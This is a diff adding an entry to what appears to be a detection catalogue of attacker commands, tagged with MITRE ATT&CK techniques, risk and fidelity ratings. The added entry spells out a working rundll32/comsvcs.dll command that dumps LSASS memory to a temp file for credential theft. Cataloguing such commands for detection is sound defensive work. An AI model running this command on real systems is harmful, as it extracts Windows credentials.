@@ -20,3 +20,26 @@
   threatactors:
     N/A:
       - N/A
+- command: C:\Windows\System32\rundll32.exe C:\windows\System32\comsvcs.dll, MiniDump (Get-Process lsass).id $env:TEMP\lsass-comsvcs.dmp full
+  description: Abuse rundll32 with comsvcs.dll to perform a minidump of the LSASS process using MiniDumpWriteDump.
+  killchain:
+    - Actions on Objectives
+  mitre:
+    Defense Evasion:
+      - T1218.011
+    Credential Access:
+      - T1003.001
+  os:
+    - Windows
+  references:
+    - https://lolbas-project.github.io/lolbas/Libraries/comsvcs/
+    - https://modexp.wordpress.com/2019/08/30/minidumpwritedump-via-com-services-dll/
+    - https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1003.001/T1003.001.md
+  risk: High
+  risk_reason: Manual usage of rundll32 with comsvcs.dll is a suspicious activity, especially dumping Process Memory.
+  fidelity: High
+  fidelity_reason: This is typically a rare behavior in most organizations.
+  tool: comsvcs
+  threatactors:
+    N/A:
+      - N/A
